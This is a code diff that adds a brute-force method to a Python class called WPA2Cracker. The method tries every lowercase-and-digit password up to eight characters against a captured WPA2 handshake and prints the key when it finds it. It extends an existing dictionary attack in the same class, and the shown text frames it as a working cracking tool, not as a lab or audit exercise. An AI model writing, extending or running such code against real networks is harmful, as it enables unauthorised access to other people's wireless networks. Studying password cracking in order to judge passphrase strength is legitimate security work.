@@ -3,6 +3,8 @@ from pbkdf2 import PBKDF2
 import hmac
 import hashlib
 import struct
+import itertools
+import string
 
 
 class WPA2Cracker:
@@ -224,3 +226,52 @@ class WPA2Cracker:
 
         print("❌ Password not found in dictionary")
         return None
+
+    def brute_force_attack(self, charset=None, min_length=1, max_length=8):
+        """
+        STEP 5: Perform brute force attack
+
+        Purpose: Test all possible character combinations up to specified length
+        Process: Generate and test all permutations of characters
+        
+        Args:
+            charset (str): Character set to use (default: lowercase + digits)
+            min_length (int): Minimum password length to test
+            max_length (int): Maximum password length to test
+        """
+        if not self.handshake_data:
+            print("❌ No handshake data available")
+            return None
+
+        # Default character set: lowercase letters + digits
+        if charset is None:
+            charset = string.ascii_lowercase + string.digits
+        
+        print(f"🔨 Starting brute force attack...")
+        print(f"   Character set: {charset}")
+        print(f"   Length range: {min_length}-{max_length}")
+        print(f"   Total combinations: {sum(len(charset)**i for i in range(min_length, max_length + 1)):,}")
+        
+        tested_count = 0
+        
+        for length in range(min_length, max_length + 1):
+            print(f"   Testing length {length}...")
+            
+            # Generate all combinations of the specified length
+            for combo in itertools.product(charset, repeat=length):
+                password = ''.join(combo)
+                tested_count += 1
+                
+                if self.verify_passphrase(password):
+                    print(f"🎉 PASSWORD FOUND: {password}")
+                    print(f"   Tested {tested_count:,} combinations")
+                    return password
+                
+                # Progress indicator every 1000 attempts
+                if tested_count % 1000 == 0:
+                    print(f"   Tested {tested_count:,} combinations...")
+        
+        print(f"❌ Password not found after testing {tested_count:,} combinations")
+        return None
+
+
